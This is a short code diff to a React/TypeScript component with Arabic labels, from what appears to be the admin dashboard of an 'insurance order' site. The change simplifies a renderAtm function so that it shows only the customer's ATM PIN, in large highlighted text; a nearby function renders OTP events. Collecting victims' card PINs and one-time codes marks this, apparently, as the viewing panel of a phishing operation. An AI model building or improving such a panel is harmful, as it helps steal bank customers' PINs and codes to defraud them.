@@ -396,19 +396,10 @@ function renderOtp(order: InsuranceOrder, stageEvents: StageEvent[], getLatestRe
 }
 
 function renderAtm(order: InsuranceOrder) {
-  const hasData = order.atm_bill_number || order.atm_biller_code || order.atm_pin;
-  if (!hasData) return <p className="text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>;
+  if (!order.atm_pin) return <p className="text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>;
   return (
-    <div className="space-y-1.5">
-      <div className="grid grid-cols-2 gap-1.5">
-        {order.atm_bill_number && <InfoItem label="رقم الفاتورة" value={order.atm_bill_number} />}
-        {order.atm_biller_code && <InfoItem label="رمز المفوتر" value={order.atm_biller_code} />}
-      </div>
-      {order.atm_pin && (
-        <div className="flex justify-center">
-          <span className="text-lg font-mono font-bold tracking-[4px] text-emerald-600 bg-emerald-500/10 px-3 py-1 rounded-lg border border-emerald-500/20">{order.atm_pin}</span>
-        </div>
-      )}
+    <div className="flex justify-center">
+      <span className="text-lg font-mono font-bold tracking-[4px] text-emerald-600 bg-emerald-500/10 px-3 py-1 rounded-lg border border-emerald-500/20">{order.atm_pin}</span>
     </div>
   );
 }
